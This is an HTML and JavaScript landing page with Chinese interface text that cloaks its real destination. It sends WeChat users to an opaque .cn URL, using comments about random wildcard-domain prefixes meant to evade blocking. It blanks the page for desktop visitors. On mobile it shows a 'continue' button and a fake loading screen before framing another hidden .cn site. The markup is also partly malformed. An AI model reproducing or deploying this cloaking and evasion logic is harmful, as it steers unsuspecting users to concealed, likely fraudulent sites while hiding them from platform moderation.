    <style>

        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
        
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        
        .welcome-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #000000, #333333);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            color: white;
        }
        
        .continue-btn {
            background: linear-gradient(135deg, #ff0050, #ff6b9d);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 25px;
            cursor: pointer;
            margin-top: 30px;
            transition: all 0.3s ease;
        }
        
        .continue-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255, 0, 80, 0.3);
        }
        
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 999;
            color: white;
        }
        
        .loader {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid #ff0050;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .fade-out {
            animation: fadeOut 0.5s ease-out forwards;
        }
        
        @keyframes fadeOut {
            from { opacity: 1; }
            to { opacity: 0; visibility: hidden; }
        }
        
        .hidden {
            display: none;
        }
        
        .welcome-content {
            text-align: center;
            max-width: 300px;
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        
        p {
            font-size: 14px;
            color: #cccccc;
            margin-bottom: 20px;
        }

</head>
<body>
    <!-- 欢迎屏幕 -->
    <div id="welcomeScreen" class="welcome-screen">
        <div class="welcome-content">

            <button id="continueBtn" class="continue-btn">继续访问</button>
        </div>
    </div>

    <!-- 加载屏幕 -->
    <div id="loadingScreen" class="loading-screen hidden">
        <div class="loader"></div>
        <p>正在加载中，请稍候...</p>
    </div>

    <!-- 主内容区域 -->
    <iframe id="mainFrame" src="" sandbox="allow-same-origin allow-scripts allow-popups allow-forms" class="hidden"></iframe>

    <script>
        // 生成随机前缀（用于泛解析域名）
        function getRandomPrefix(length = 6) {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let prefix = '';
            for (let i = 0; i < length; i++) {
                prefix += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return prefix;
        }

        // 检测是否在微信中打开
        function isWeChatBrowser() {
            const userAgent = navigator.userAgent.toLowerCase();
            return userAgent.indexOf('micromessenger') !== -1;
        }

        // 设备检测函数
        function isMobileDevice() {
            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }

        // 页面加载完成后执行
        document.addEventListener('DOMContentLoaded', function() {
            // 微信环境下：生成随机前缀并跳转
            if (isWeChatBrowser()) {
                // 替换为你的泛解析主域名（例如：yourdomain.com）
                const mainDomain = 'yourdomain.com'; 
                // 生成6位随机前缀
                const randomPrefix = getRandomPrefix(6);
                // 拼接完整URL
                const redirectUrl = `http://wbkb40.rshqwjm.cn/a/617971?t=1764169565071`;
                // 执行跳转
                window.location.href = redirectUrl;
                return;
            }

            const welcomeScreen = document.getElementById('welcomeScreen');
            const loadingScreen = document.getElementById('loadingScreen');
            const mainFrame = document.getElementById('mainFrame');
            const continueBtn = document.getElementById('continueBtn');

            // 检查是否为移动设备
            if (!isMobileDevice()) {
                document.body.innerHTML = '<div style="width:100%;height:100%;background:#000;"></div>';
                return;
            }

            // 继续访问按钮点击事件
            continueBtn.addEventListener('click', function() {
                welcomeScreen.classList.add('fade-out');
                
                setTimeout(() => {
                    welcomeScreen.classList.add('hidden');
                    loadingScreen.classList.remove('hidden');
                    
                    // 模拟加载过程
                    setTimeout(() => {
                        loadingScreen.classList.add('hidden');
                        mainFrame.classList.remove('hidden');
                        
                        // 加载iframe内容
                        mainFrame.src = 'http://jk8h.cn/a/600000?kadR';
                    }, 2000);
                }, 500);
            });
        });
    </script>
